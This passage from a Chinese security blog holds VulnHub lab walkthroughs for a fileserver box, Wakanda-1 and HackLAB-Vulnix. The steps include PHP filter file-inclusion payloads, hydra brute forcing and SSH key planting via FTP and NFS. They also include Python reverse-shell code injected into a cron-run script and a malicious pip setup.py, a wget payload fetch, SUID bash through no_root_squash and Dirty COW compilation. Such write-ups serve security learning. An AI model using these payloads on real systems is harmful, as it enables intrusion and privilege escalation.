ssh</span><br><span class="line">80/tcp   open  http</span><br><span class="line">111/tcp  open  rpcbind</span><br><span class="line">445/tcp  open  microsoft-ds</span><br><span class="line">2049/tcp open  nfs</span><br><span class="line">2121/tcp open  ccproxy-ftp</span><br></pre></td></tr></table></figure><p>再用<code>-A</code>进行详细扫描, 发现如下:</p><ul><li>21/ftp 允许匿名登录</li><li>2121/ftp 允许匿名登录</li><li>OS居然是windows, 可能是虚拟机</li></ul><p>http访问, 只有一个跳转链接, 甚至是卖课的; 利用目录扫描扫描到readme.txt, 内容如下:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">My Password is</span><br><span class="line">rootroot1</span><br></pre></td></tr></table></figure><p>利用cewl爬可用字符串, 爆破发现无用</p><p>ftp匿名登录, 两个都是日志信息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ftp 192.168.56.104</span><br><span class="line">anonymous</span><br></pre></td></tr></table></figure><p>尝试利用nfs挂载目录到本地, 失败; rpc更是只有信息无法利用; 那就只剩下445端口的smb服务辽</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看共享文件夹信息</span></span><br><span class="line">smbmap -H 192.168.56.104</span><br></pre></td></tr></table></figure><p>四个用户只有一个可以访问, 那就看看详细信息; 需要密码, 试了一下之前发现的<code>rootroot1</code>发现可以登录</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看详细信息</span></span><br><span class="line">smbclient //192.168.56.104/smbdata</span><br><span class="line">smbuser</span><br></pre></td></tr></table></figure><p>但是还是这个日志界面, 那就审计呗, 这一大堆日志</p><p>secure文件中新增了用户<code>smbuser</code>, 同时还有密码<code>chauthtok</code>, 但是根据sshd_config可得, 只能通过公钥登录</p><h2 id="getshell"><a class="header-anchor" href="#getshell">¶</a>getshell</h2><p>在测试ftp的时候发现利用<code>rootroot1</code>也可以登录<code>smbuser</code>的ftp, 且查看所在路径的时候是在<code>smbuser</code>用户目录下, 那就可以写公钥了</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># kali在root权限生成rsa密钥对</span></span><br><span class="line">ssh-keygen -t rsa</span><br><span class="line"><span class="built_in">cd</span> /root/.ssh </span><br><span class="line"><span class="built_in">cat</span> id_rsa.pub</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;刚才id_rsa.pub的内容&#x27;</span> &gt; authorized_keys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在这个目录登录ftp</span></span><br><span class="line"><span class="built_in">mkdir</span> .ssh</span><br><span class="line"><span class="built_in">cd</span> .ssh</span><br><span class="line">put authorized_keys</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241219174546.png" alt="image.png"></p><p>此时再登录即可getshell</p><h2 id="信息收集-v2"><a class="header-anchor" href="#信息收集-v2">¶</a>信息收集</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 系统信息 Linux fileserver 3.10.0-229.el7.x86_64 #1 SMP Fri Mar 6 11:36:42 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux</span></span><br><span class="line"><span class="built_in">uname</span> -a</span><br><span class="line"><span class="comment"># 内核版本 3.10.0-229.el7.x86_64</span></span><br><span class="line"><span class="built_in">uname</span> -r</span><br><span class="line"><span class="comment"># 查看环境</span></span><br><span class="line">gcc -v</span><br><span class="line">python -h</span><br><span class="line"><span class="comment"># 查看特权文件, 没啥东西</span></span><br><span class="line">find / -perm -4000 2&gt;/dev/null</span><br><span class="line"><span class="comment"># 自启动看看, 没东西</span></span><br><span class="line"><span class="built_in">cat</span> /etc/crontab</span><br></pre></td></tr></table></figure><p>看看<code>/etc/passwd</code>, 没有其他用户; 这下只能用脚本跑了</p><p>测试了一堆还是脏牛好用, 编译后直接运行即可拿到flag</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 文件位置</span></span><br><span class="line">locate linux/local/40616.c </span><br><span class="line"><span class="comment"># 编译方式</span></span><br><span class="line">gcc 40616.c -o 40616 -pthread</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241219182001.png" alt="image.png"></p><p>最后flag在root文件夹下</p><blockquote><p>报错退出后不知道为什么运行不了第二次, 删掉<code>/tmp/bak</code>后, 运行<code>./40616 123456</code>又可以了</p><p>过一会就会 Broken pipe报错退出, 尽快完成</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> vulnhub靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 提权 </tag>
            
            <tag> 信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Wakanda-1</title>
      <link href="/article/Wakanda-1/"/>
      <url>/article/Wakanda-1/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>Wakanda: 1</h1><hr><blockquote><p>来源: <a href="https://www.vulnhub.com/entry/wakanda-1,251/">vulnhub靶场-Wakanda: 1</a></p><p>目标: Flags: There are three flags (flag1.txt, flag2.txt, root.txt)</p><p>提示: Follow your intuitions … and enumerate!</p><p>妙妙工具: <code>python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'</code></p></blockquote><h2 id="环境配置"><a class="header-anchor" href="#环境配置">¶</a>环境配置</h2><ul><li>kali: 192.168.56.5</li><li>target: 192.168.56.101</li></ul><h2 id="信息收集"><a class="header-anchor" href="#信息收集">¶</a>信息收集</h2><p>nmap扫描得到靶机ip和对应信息</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sS 192.168.56.0/24</span><br><span class="line"></span><br><span class="line">80/tcp http</span><br><span class="line">111/tcp rpcbind</span><br><span class="line">3333/tcp dec-notes</span><br></pre></td></tr></table></figure><blockquote><p>其实测试后发现3333是ssh端口, 可以利用ssh链接</p></blockquote><p>http下手, 首先是网站下方有一个<code>Made by@mamadou</code>的描述, 可能是用户名</p><p>然后是查看源码, 给了如下提示:</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- &lt;a class=&quot;nav-link active&quot; href=&quot;?lang=fr&quot;&gt;Fr/a&gt; --&gt;</span></span><br></pre></td></tr></table></figure><p>尝试给网站传参<code>?lang=fr</code>, 发现变成了法语网站, 那么这就是一个传参点, 等下看看有什么利用方法</p><p>目录扫描, 扫出来的访问都为空;</p><p>实在是没有其他的地方可以用了, 看看这个传参点能不能用</p><p>在测试了几类后, 猜测可能是文件包含; 因为当我访问<code>192.168.56.101/fr.php</code>的时候, 返回的并不是Not Found而是空白界面, 说明存在一个<code>fr.php</code>文件, 且传入<code>?lang=fr</code>的时候被首页包含了</p><p>所以我们尝试伪协议读取文件, 注意包含时自带后缀:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?lang=php://filter/convert.base64-encode/resource=index</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241218222336.png" alt="image.png"></p><p>如果你觉得还要解码比较麻烦, 就试试这个, 可以直接拿到源码</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl http://192.168.247.152/?lang=php://filter/convert.base64-encode/resource=index | <span class="built_in">head</span> -n 1 | <span class="built_in">base64</span> -d</span><br></pre></td></tr></table></figure><p>现在我们拿到了密码<code>Niamey4Ever227!!!</code>, 不知道用户名, 比较简单的方法就是全部爬下来然后爆破</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cewl 192.168.56.101 -w 1.txt</span><br><span class="line">hydra -L 1.txt -p <span class="string">&#x27;Niamey4Ever227!!!&#x27;</span> ssh://192.168.56.101:3333</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241218223543.png" alt="image.png"></p><p>得到账号密码: <code>mamadou : Niamey4Ever227!!!</code></p><h2 id="getshell"><a class="header-anchor" href="#getshell">¶</a>getshell</h2><p>ssh登录靶机, 登录后发现是python终端; 这时候使用我们的妙妙工具</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh mamadou@192.168.56.101 -p 3333</span><br><span class="line"><span class="comment"># Niamey4Ever227!!!</span></span><br><span class="line">import pty; pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241218223845.png" alt="image.png"></p><h2 id="信息收集-v2"><a class="header-anchor" href="#信息收集-v2">¶</a>信息收集</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 系统信息 Linux Wakanda1 3.16.0-6-amd64 #1 SMP Debian 3.16.57-2 (2018-07-14) x86_64 GNU/Linux</span></span><br><span class="line"><span class="built_in">uname</span> -a</span><br><span class="line"><span class="comment"># 内核版本 3.16.0-6-amd64</span></span><br><span class="line"><span class="built_in">uname</span> -r</span><br><span class="line"><span class="comment"># Debian GNU/Linux 8.11 (jessie)</span></span><br><span class="line">lsb_release -a</span><br><span class="line"><span class="comment"># 查看环境</span></span><br><span class="line">gcc -v</span><br></pre></td></tr></table></figure><p>没什么好说的, 看看怎么提权</p><p>首先在kali搜索, 发现没有什么可以用的, 那还是老老实实找flag吧</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit Debian 8</span><br></pre></td></tr></table></figure><p>看看有没有其他用户(大于1000的就是用户):</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/passwd</span><br><span class="line"><span class="comment"># devops</span></span><br></pre></td></tr></table></figure><p>看看有没有什么特权文件:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看特权文件, 没啥东西</span></span><br><span class="line">find / -perm -4000 2&gt;/dev/null</span><br><span class="line"><span class="comment"># mamadou用户可以访问的东西</span></span><br><span class="line">find / -user mamadou 2&gt;&amp;1 | grep -v <span class="string">&quot;Permission denied\|proc&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241218225926.png" alt="image.png"></p><blockquote><p>那些44302的是我测试用的, 真没用别试了</p></blockquote><p>flag1抓出来看看: <code>Flag : d86b9ad71ca887f4dd1dac86ba1c4dfc</code></p><p>看看自己的<code>sudo -l</code>, 也没啥东西; 那就看看别的用户:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># devops用户可以访问的东西</span></span><br><span class="line">find / -user devops 2&gt;&amp;1 | grep -v <span class="string">&quot;Permission denied\|proc&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241218230526.png" alt="image.png"></p><p>看看flag2, 发现Permission denied, 切换用户肯定无法直接su, 看看有没有别的文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/srv/.antivirus.py</span><br><span class="line">/tmp/test</span><br></pre></td></tr></table></figure><p>查看<code>/srv/.antivirus.py</code>, 发现是一个写test文件进/tmp目录的py程序, 去看看这个test</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241218231258.png" alt="image.png"></p><p>发现这个文件的归属是devops, 而且时间也比较新, 不像是一直在这里的, 似乎是刚才生成的; 那可能就是有个文件一直在运行<code>/srv/.antivirus.py</code></p><p>找找文件:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 找关于antivirus的有关的有权限执行的文件</span></span><br><span class="line">find / -name *antivirus* 2&gt;/dev/null | grep -v <span class="string">&quot;permission denied\|proc&quot;</span></span><br><span class="line"><span class="comment"># /srv/.antivirus.py</span></span><br><span class="line"><span class="comment"># /lib/systemd/system/antivirus.service</span></span><br><span class="line"><span class="comment"># /etc/systemd/system/multi-user.target.wants/antivirus.service</span></span><br><span class="line"><span class="built_in">cat</span> /lib/systemd/system/antivirus.service</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241218231535.png" alt="image.png"></p><p>每300s运行一次<code>/srv/.antivirus.py</code>, 我们对这个文件有写的权限, 那直接利用它进行反弹shell; 在文件后面</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nano /srv/.antivirus.py</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># .antivirus.py</span></span><br><span class="line"><span class="keyword">import</span> socket,subprocess,os</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">s.connect((<span class="string">&quot;192.168.56.5&quot;</span>, <span class="number">5555</span>))</span><br><span class="line"></span><br><span class="line">os.dup2(s.fileno(),<span class="number">0</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">1</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">2</span>)</span><br><span class="line">p = subprocess.call([<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-i&quot;</span>])</span><br></pre></td></tr></table></figure><p>等5min, 或者直接改那个文件, 让我们成功拿到devops的权限</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241218232755.png" alt="image.png"></p><p>抓flag2的内容: <code>Flag 2 : d8ce56398c88e1b4d9e5f83e64c79098</code></p><p>看看<code>sudo -l</code>, 发现可以无需密码sudo执行<code>/usr/bin/pip</code></p><blockquote><p>在有些linux机器中, 某个用户拥有pip的sudo权限, 可以利用pip install进行本地提权;</p><p>在执行pip install时会调用<code>setup.py</code>，可以在创建<strong><a href="http://xn--setup-ll4jr8a.py">恶意setup.py</a></strong>文件来达到任意命令执行</p></blockquote><p>故技重施:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># setup.py</span></span><br><span class="line"><span class="keyword">import</span> socket,subprocess,os</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">s.connect((<span class="string">&quot;192.168.56.5&quot;</span>, <span class="number">7777</span>))</span><br><span class="line"></span><br><span class="line">os.dup2(s.fileno(),<span class="number">0</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">1</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">2</span>)</span><br><span class="line">p = subprocess.call([<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-i&quot;</span>])</span><br></pre></td></tr></table></figure><p>上传让靶机下载:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># kali</span></span><br><span class="line">python3 -m http.server 10000</span><br><span class="line"></span><br><span class="line"><span class="comment"># target</span></span><br><span class="line">wget http://192.168.56.5:10000/setup.py</span><br><span class="line"><span class="built_in">chmod</span> +x setup.py</span><br><span class="line">sudo /usr/bin/pip install . --upgrade --force-reinstall</span><br></pre></td></tr></table></figure><blockquote><p>这个命令用于用root权限安装或重新安装本地开发的Python包</p></blockquote><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241218233828.png" alt="image.png"></p><p>现在去<code>/root</code>拿到最后一个flag</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241218233942.png" alt="image.png"></p><h2 id="附录"><a class="header-anchor" href="#附录">¶</a>附录</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">con</span>():</span><br><span class="line"><span class="keyword">import</span> socket, time,pty, os</span><br><span class="line">host=<span class="string">&#x27;192.168.247.129&#x27;</span></span><br><span class="line">port=<span class="number">9999</span></span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.settimeout(<span class="number">10</span>)</span><br><span class="line">s.connect((host,port))</span><br><span class="line"></span><br><span class="line">os.dup2(s.fileno(),<span class="number">0</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">1</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">2</span>)</span><br><span class="line">os.putenv(<span class="string">&quot;HISTFILE&quot;</span>,<span class="string">&#x27;/dev/null&#x27;</span>)</span><br><span class="line">pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)</span><br><span class="line">s.close()</span><br><span class="line">con()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> vulnhub靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件包含 </tag>
            
            <tag> PHP伪协议 </tag>
            
            <tag> Python反弹shell </tag>
            
            <tag> pip提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackLAB-Vulnix</title>
      <link href="/article/HackLAB-Vulnix/"/>
      <url>/article/HackLAB-Vulnix/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>HackLAB: Vulnix</h1><hr><blockquote><p>来源: <a href="https://www.vulnhub.com/entry/hacklab-vulnix,48/">vulnhub靶场-HackLAB: Vulnix</a></p><p>目标: boot up, find the IP, hack away and obtain the trophy hidden away in /root by any means you wish – excluding the actual hacking of the vmdk</p><p>提示: The host is based upon Ubuntu Server 12.04 and is fully patched as of early September 2012.</p><p>妙妙工具: <code>python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'</code></p></blockquote><h2 id="环境配置"><a class="header-anchor" href="#环境配置">¶</a>环境配置</h2><p>kali: 192.168.110.130</p><p>target:192.168.110.132</p><h2 id="信息收集"><a class="header-anchor" href="#信息收集">¶</a>信息收集</h2><p>作者在网站中给了我们一些信息: Ubuntu Server 12.04, x86架构</p><p>nmap扫描可得:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -A 192.168.110.132</span><br><span class="line"></span><br><span class="line">22/tcp OpenSSH 5.9p1</span><br><span class="line">25/tcp Postfix smtpd</span><br><span class="line">79/tcp Linux fingerd</span><br><span class="line">110/tcp Dovecot pop3d </span><br><span class="line">111/tcp rpcbind</span><br><span class="line">143/tcp Dovecot imapd</span><br><span class="line">512/tcp etkit-rsh rexecd</span><br><span class="line">513/tcp login?</span><br><span class="line">514/tcp shell Netkit rshd</span><br><span class="line">993/tcp ssl/imap Dovecot imapd</span><br><span class="line">995/tcp ssl/pop3 Dovecot pop3d</span><br><span class="line">2049/tcp nfs</span><br></pre></td></tr></table></figure><ul><li>可能出现的信息泄露: smtp服务, finger, rpc</li><li>可能利用的服务: nfs</li></ul><blockquote><p>全是没见过的, 我建议搜是什么和怎么利用</p></blockquote><p>先来看看NFS: 通常结合Kerberos使用, 因为NFS 本身仅根据用户的UID/GID对用户进行身份验证; 一旦NFS文件系统被远程主机以读/写权限成功挂载, 每个共享文件的唯一保护就是它的权限</p><p>由于目标没有Kerberos设置, 因此只需找到经过身份验证以使用NFS的用户的UID和GUID, 并创建具有相同UID和GUID的用户即可访问所有允许的文件</p><p>我们需要登录/getshell才能收集信息, 所以我们分别使用对应工具进行信息收集</p><ul><li>smtp信息枚举用的smtp-user-enum命令(我这个跑不出来不知道为什么)</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># kali自带的字典</span></span><br><span class="line">smtp-user-enum -M VRFY -U /usr/share/metasploit-framework/data/wordlists/unix_users.txt -t 192.168.110.132</span><br><span class="line"><span class="comment"># -M    ---用于猜测用户名 EXPN、VRFY 或 RCPT 的方法（默认值：VRFY）</span></span><br><span class="line"><span class="comment"># -U    ---通过 smtp 服务检查的用户名文件</span></span><br></pre></td></tr></table></figure><ul><li>finger命令</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">finger user@192.168.110.132</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241203214950.png" alt="image.png"></p><p>得到两个用户, 其中user的shell为/bin/bash说明可以登陆</p><ul><li>RPC枚举</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rpcinfo -p 192.168.110.132</span><br></pre></td></tr></table></figure><p>和nmap差不多就不说了</p><ul><li>NFS枚举与挂载</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">showmount -e 192.168.110.132</span><br><span class="line"><span class="comment"># 得到挂载目录如下 /home/vulnix *</span></span><br><span class="line"><span class="comment"># 那么我们现在就把这个文件夹挂载到我们本地</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建个挂载目录</span></span><br><span class="line"><span class="built_in">mkdir</span> nfs   </span><br><span class="line"><span class="comment"># 挂载vulnix目录(记得用root权限)</span></span><br><span class="line">mount -t nfs 192.168.110.132:/home/vulnix /tmp/nfs  </span><br><span class="line"><span class="built_in">cd</span> nfs </span><br><span class="line"><span class="comment"># cd: permission denied: nfs</span></span><br></pre></td></tr></table></figure><p>显示权限不够, 应该是设置了root_squash(后面读取配置, 确实如此)</p><p>此时共享已经完成, 接下来只需要创建一个用户具有相同的id与gid用户即可</p><h2 id="getshell"><a class="header-anchor" href="#getshell">¶</a>getshell</h2><p>已知用户名, 那就利用rockyou密码本爆破; 可以得到<code>user</code>密码为<code>letmein</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">locate rockyou.txt</span><br><span class="line"><span class="comment"># /usr/share/wordlists/rockyou.txt.gz</span></span><br><span class="line">hydra -l user -P /home/kali/Desktop/tools/rockyou.txt 192.168.110.132 ssh -t 4</span><br></pre></td></tr></table></figure><p>ssh连接即可</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh user@192.168.110.132</span><br><span class="line"><span class="comment"># letmein</span></span><br></pre></td></tr></table></figure><h2 id="信息收集-v2"><a class="header-anchor" href="#信息收集-v2">¶</a>信息收集</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/passwd</span><br><span class="line"><span class="comment"># 查看vulnix的权限</span></span><br><span class="line"><span class="comment"># vulnix:x:2008:2008::/home/vulnix:/bin/bash</span></span><br></pre></td></tr></table></figure><p>用户名: vulnx, 用户权限2008, 在kali上创建这个用户</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">useradd -u 2008 vulnix</span><br><span class="line"><span class="comment"># 切换这个用户</span></span><br><span class="line">su vulnix</span><br><span class="line"><span class="built_in">cd</span> nfs</span><br><span class="line"><span class="comment"># 执行命令</span></span><br><span class="line"><span class="built_in">df</span></span><br><span class="line"><span class="built_in">ls</span> -a</span><br></pre></td></tr></table></figure><h2 id="ssh毒化"><a class="header-anchor" href="#ssh毒化">¶</a>ssh毒化</h2><p>尝试ssh毒化(通过ssh写密钥来登录该用户)</p><p>SSH密钥毒化指的是通过在目标系统中注入恶意的SSH密钥, 篡改或伪造SSH公钥身份验证的过程, 从而获得对目标系统的访问权限</p><p>现在我们来写公钥来登录靶机的vulnix用户</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># kali在root权限生成rsa密钥对</span></span><br><span class="line">ssh-keygen -t rsa</span><br><span class="line"><span class="built_in">cd</span> /root/.ssh </span><br><span class="line"><span class="comment"># 复制公钥</span></span><br><span class="line"><span class="built_in">cat</span> id_rsa.pub</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在共享目录下创建.ssh目录mkdir .ssh</span></span><br><span class="line">su vulnix</span><br><span class="line"><span class="built_in">cd</span> nfs</span><br><span class="line"><span class="built_in">mkdir</span> .ssh</span><br><span class="line"><span class="built_in">cd</span> .ssh</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;刚才id_rsa.pub的内容&#x27;</span> &gt; authorized_keys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看/etc/ssh/sshd_config,发现配置项AuthorizedKeysFile是注释状态</span></span><br><span class="line"><span class="comment"># 下面这个是登录不了的,但是似乎不是配置问题</span></span><br><span class="line">ssh -i /root/.ssh/id_rsa vulnix@192.168.110.132</span><br><span class="line"><span class="comment"># 最后发现是因为openssh的问题,我们需要加上参数</span></span><br><span class="line">ssh -o <span class="string">&#x27;PubkeyAcceptedKeyTypes +ssh-rsa&#x27;</span> -i /root/.ssh/id_rsa vulnix@192.168.110.132</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241207213615.png" alt="image.png"></p><h2 id="提权"><a class="header-anchor" href="#提权">¶</a>提权</h2><h3 id="sudo提权"><a class="header-anchor" href="#sudo提权">¶</a>sudo提权?</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br><span class="line"><span class="comment"># 回显信息如下：</span></span><br><span class="line">User vulnix may run the following commands on this host:</span><br><span class="line">    (root) sudoedit /etc/exports, (root) NOPASSWD: sudoedit /etc/exports</span><br><span class="line"><span class="comment"># 可以以root用户身份执行sudoedit /etc/exports</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /etc/exports</span><br><span class="line"><span class="comment"># 似乎是nfs的配置文件, 其中有这么一条</span></span><br><span class="line"><span class="comment"># /home/vulnix*(rw,root_squash)</span></span><br><span class="line"></span><br><span class="line">sudoedit /etc/exports  </span><br><span class="line"><span class="comment"># root权限编辑文件, 添加：/root *(rw,no_root_squash)</span></span><br><span class="line"><span class="comment"># 修改/home/vulnix那一条为no_root_squash</span></span><br><span class="line"><span class="comment"># 编辑方式为直接输入, ctrl+x退出,输入y然后回车即可保存</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241207220419.png" alt="image.png"></p><blockquote><p>root_squash: 客户端的root用户映射到任何人; 客户端无法使用setuid位将恶意软件留给他人执行</p><p>no_root_squash: 通过此选项, 停用了此安全功能, 从而允许客户端的root权限操作最终以root身份出现在导出的文件系统中</p><p>危害: 如果配置为no_root_squash, 远程 root 用户可以更改共享文件系统上的任何文件, 并留下被木马感染的应用程序, 让其他用户无意中执行。</p></blockquote><p>现在重启靶机, 让配置更改生效;</p><p>为了防止你不知道为什么要像上下文这么做, 先解释一下:</p><p>如果我们直接从本地传给靶机, 那么我们的shell是64位的, 与靶场的32位环境不兼容;</p><p>如果是我们从靶场cp一个shell到他的挂载文件夹, 那么就是32位的, 因为那是他的原生shell; 但是这又会导致权限不足的问题, 那么我们再用root的kali把这个shell弄到另一个文件里, 那么因为是root执行的, 那么这个shell就会变成root</p><p>而修改配置, 可以让我们<strong>以本地root的权限进入到共享目录中</strong>, 实现下面的操作</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">showmount -e 192.168.110.132</span><br><span class="line"><span class="comment"># 在kali将全部挂载删除</span></span><br><span class="line">umount /tmp/nfs</span><br><span class="line"><span class="comment"># 重新挂在到nfs目录下,此时本地root权限用户应该可以进入nfs文件夹</span></span><br><span class="line">mount -t nfs 192.168.110.132:/home/vulnix /tmp/nfs</span><br><span class="line"></span><br><span class="line"><span class="comment"># ssh登录靶机执行</span></span><br><span class="line">ssh -o <span class="string">&#x27;PubkeyAcceptedKeyTypes +ssh-rsa&#x27;</span> -i /root/.ssh/id_rsa vulnix@192.168.110.132</span><br><span class="line"><span class="built_in">cp</span> /bin/bash .</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在kali的root权限下进入nfs文件夹将文件复制一次再赋权</span></span><br><span class="line"><span class="built_in">cat</span> bash &gt; <span class="built_in">test</span></span><br><span class="line"><span class="built_in">chmod</span> 4777 <span class="built_in">test</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241208183750.png" alt="image.png"></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 回到ssh登录的vulnix用户,以特权模式运行该bash</span></span><br><span class="line"><span class="comment"># 意思就是如果文件原权限为root,则特权模式下运行也为root</span></span><br><span class="line">./test -p</span><br><span class="line"><span class="built_in">id</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241208183533.png" alt="image.png"></p><blockquote><p>关于 -p 打开特权模式</p><p>在此模式下, 不处理<code>$ENV</code>和<code>$BASH_ENV</code>文件, 不从环境继承shell函数, 并且如果 SHELLOPTS、BASHOPTS、CDPATH和GLOBIGNORE变量出现在环境中, 它们将被忽略;</p><p>如果shell不等于真实用户(组)id的有效用户(组)id就会启动, 并且没有提供-p选项则执行这些操作并将有效用户id设置为真实用户ID; 如果在启动时提供了-p选项, 则不会重置有效的用户ID; 关闭此选项会导致有效用户和组ID设置为真实用户和组ID</p></blockquote><h3 id="给root写公钥"><a class="header-anchor" href="#给root写公钥">¶</a>给root写公钥</h3><p>需要重启靶机(我们没有权限重启服务, 还是不如其他方法好)</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudoedit /etc/exports</span><br><span class="line"><span class="comment"># 这个地方修改为/root, 然后保存重启环境(前面已经改了)</span></span><br><span class="line">showmount -e 192.168.110.132</span><br><span class="line"><span class="comment"># 这个时候就能看到root可以被挂载，然后我们直接挂</span></span><br><span class="line">mount -t nfs 192.168.110.132:/root /tmp/nfs</span><br><span class="line"><span class="comment"># 然后再跟之前一样的写公钥利用SSH登录即可</span></span><br></pre></td></tr></table></figure><h3 id="dirty-cow漏洞利用"><a class="header-anchor" 